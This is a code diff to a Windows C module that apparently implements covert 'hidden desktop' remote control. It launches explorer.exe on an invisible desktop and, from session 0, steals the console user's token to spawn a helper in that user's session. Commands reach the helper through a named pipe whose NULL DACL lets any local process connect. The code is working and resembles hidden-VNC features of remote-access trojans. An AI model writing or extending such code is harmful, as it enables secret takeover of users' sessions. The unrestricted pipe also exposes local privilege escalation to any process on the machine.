@@ -1,10 +1,12 @@
 #include <windows.h>
+#include <wtsapi32.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
 
 static HDESK g_hd;
+static int g_is_host;
 
 static char *dupstr(const char *s) {
     size_t n = strlen(s);
@@ -51,7 +53,7 @@ static char *on_desktop(char *(*fn)(void *), void *arg) {
 }
 
 static char *do_start(void *arg) {
-    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\cmd.exe";
+    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\explorer.exe";
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     wchar_t desktop[] = L"WinSta0\\SockPuppetsHD";
@@ -188,10 +190,130 @@ static char *do_key(void *arg) {
     }
 }
 
+static int session_id(void) {
+    DWORD sid = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
+    return (int)sid;
+}
+
+static int write_all(HANDLE h, const void *buf, DWORD n) {
+    const char *p = buf;
+    while (n) {
+        DWORD w = 0;
+        if (!WriteFile(h, p, n, &w, NULL) || !w) return 0;
+        p += w;
+        n -= w;
+    }
+    return 1;
+}
+
+static int read_all(HANDLE h, void *buf, DWORD n) {
+    char *p = buf;
+    while (n) {
+        DWORD r = 0;
+        if (!ReadFile(h, p, n, &r, NULL) || !r) return 0;
+        p += r;
+        n -= r;
+    }
+    return 1;
+}
+
+static HANDLE hd_pipe(void) {
+    return CreateFileA("\\\\.\\pipe\\SockPuppetsHD", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+}
+
+static int launch_host(void) {
+    DWORD sid = WTSGetActiveConsoleSessionId();
+    HANDLE tok = NULL, dup = NULL;
+    if (sid == 0xFFFFFFFF || !WTSQueryUserToken(sid, &tok)) return 0;
+    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
+        CloseHandle(tok);
+        return 0;
+    }
+    CloseHandle(tok);
+    char exe[MAX_PATH], cmd[MAX_PATH + 32];
+    GetModuleFileNameA(NULL, exe, MAX_PATH);
+    snprintf(cmd, sizeof(cmd), "\"%s\" --hd-host", exe);
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    si.lpDesktop = "winsta0\\default";
+    if (!CreateProcessAsUserA(dup, NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(dup);
+        return 0;
+    }
+    CloseHandle(dup);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 1;
+}
+
+static char *via_host(const char *cmd) {
+    HANDLE h = hd_pipe();
+    if (h == INVALID_HANDLE_VALUE) {
+        if (!launch_host()) return dupstr("desktop host failed");
+        for (int i = 0; i < 40 && h == INVALID_HANDLE_VALUE; i++) {
+            Sleep(250);
+            h = hd_pipe();
+        }
+        if (h == INVALID_HANDLE_VALUE) return dupstr("desktop host not ready");
+    }
+    DWORD n = (DWORD)strlen(cmd);
+    char *out = NULL;
+    if (write_all(h, &n, 4) && write_all(h, cmd, n) && read_all(h, &n, 4) && n < 8 * 1024 * 1024) {
+        out = (char *)malloc(n + 1);
+        if (out && read_all(h, out, n)) out[n] = 0;
+        else { free(out); out = NULL; }
+    }
+    CloseHandle(h);
+    return out ? out : dupstr("desktop host io failed");
+}
+
+char *hidden_desktop(const char *cmd);
+
+int hd_host_main(void) {
+    SECURITY_DESCRIPTOR sd;
+    SECURITY_ATTRIBUTES sa;
+    g_is_host = 1;
+    if (!ensure()) return 1;
+    on_desktop(do_start, "C:\\Windows\\explorer.exe");
+    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
+    sa.nLength = sizeof(sa);
+    sa.lpSecurityDescriptor = &sd;
+    sa.bInheritHandle = FALSE;
+    for (;;) {
+        HANDLE pipe = CreateNamedPipeA("\\\\.\\pipe\\SockPuppetsHD", PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_BYTE | PIPE_WAIT, 1, 1 << 20, 1 << 20, 0, &sa);
+        if (pipe == INVALID_HANDLE_VALUE) return 1;
+        if (ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
+            DWORD n = 0;
+            if (read_all(pipe, &n, 4) && n < 4096) {
+                char *cmd = (char *)malloc(n + 1);
+                if (cmd && read_all(pipe, cmd, n)) {
+                    char *resp;
+                    cmd[n] = 0;
+                    resp = hidden_desktop(cmd);
+                    n = (DWORD)strlen(resp);
+                    write_all(pipe, &n, 4);
+                    write_all(pipe, resp, n);
+                    free(resp);
+                }
+                free(cmd);
+            }
+        }
+        DisconnectNamedPipe(pipe);
+        CloseHandle(pipe);
+    }
+}
+
 char *hidden_desktop(const char *cmd) {
     const char *rest, *sp, *action, *arg;
     char act[32];
     if (!cmd || strncmp(cmd, "__hd:", 5) != 0) return dupstr("unknown desktop action");
+    if (!g_is_host && session_id() == 0) return via_host(cmd);
     rest = cmd + 5;
     while (*rest == ' ') rest++;
     sp = strchr(rest, ' ');
